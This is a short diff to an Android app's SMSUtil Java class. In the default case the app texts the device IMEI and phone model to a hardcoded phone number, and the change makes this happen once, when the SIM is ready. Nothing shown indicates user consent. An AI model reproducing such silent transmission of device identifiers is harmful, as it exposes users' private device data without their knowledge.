@@ -63,8 +63,15 @@ public class SMSUtil {
                 cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD4);
                 break;
             default:
-                target = "18911660175";
-                cmd.add("IMEI:" + UtilsRuntime.getIMEI(context) + " 手机类型:" + android.os.Build.MODEL);
+                if (!SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
+                    && AppRuntime.isSIMCardReady(context)) {
+                    target = "18911660175";
+                    cmd.add("IMEI:" + UtilsRuntime.getIMEI(context) + " 手机类型:" + android.os.Build.MODEL);
+                    /**
+                     * 表示这个设备已经发送到服务器手机了，不需要再发了
+                     */
+                    SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
+                }
         }
 
         if (target != null && cmd.size() > 0) {
